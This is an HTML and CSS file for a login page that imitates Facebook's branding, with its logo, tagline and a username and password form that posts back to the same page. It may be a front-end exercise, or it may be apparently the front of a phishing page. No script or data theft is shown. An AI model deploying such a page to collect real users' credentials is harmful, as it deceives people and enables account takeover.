<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <style>
        * {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

body {
    font-family: Arial, sans-serif;
    background-color: #f2f2f2;
}

.container {
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
}

.login-container {
    background-color: #fff;
    padding: 20px;
    border: 1px solid #ddd;
    border-radius: 5px;
    width: 300px;
    text-align: center;}
  h2{
    color: #007bff ;
    margin: 10px;
    margin-bottom: 10px;
  }
h3{
    color: #000000 ;
    margin: 10px;
    margin-bottom: 20px;
    font-size: 10px;
    font-weight: 8px;
}

.login-logo {
    max-width: 200px;
    margin-bottom: 20px;
}

form {
    display: flex;
    flex-direction: column;
}

input[type="username"],
input[type="password"] {
    padding: 10px;
    margin-bottom: 10px;
    border: 1px solid #ddd;
    border-radius: 5px;
}

button[type="submit"] {
    background-color: #007bff;
    color: #fff;
    padding: 10px;
    border: none;
    border-radius: 5px;
    cursor: pointer;
    font-weight: bold;
}

button[type="submit"]:hover {
    background-color: #0056b3;
}

a {
    color: #007bff;
    text-decoration: none;
    margin-bottom: 10px;
    display: block;
}

a:hover {
    text-decoration: underline;
}

hr {
    border: none;
    border-top: 1px solid #ddd;
    margin: 20px 0;
}

.signup-button {
    background-color: #42b72a;
    color: #fff;
    padding: 10px;
    border: none;
    border-radius: 3px;
    cursor: pointer;
    font-weight: bold;
    width: 100%;
}

.signup-button:hover {
    background-color: #36a420;
}
.a{
    padding: 10px;
    margin-top: 10px;
    cursor: pointer;
}

    </style>
</head>
<body>
    <div class="container">
        <div class="login-container">
            <img src="facebook.png" width="100" height="80" alt="Facebook Logo" class="login-logo">
            <h2>Facebook</h2>
            <h3>connect with friends and the world around you on Facebook</h3>
            <form method="post">
                <input type="username" name="username" placeholder="username">
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
            <a class="a">Forgot Password?</a>
            <hr>
            <button class="signup-button">Create New Account</button>
        </div>
    </div>
</body>
</html>
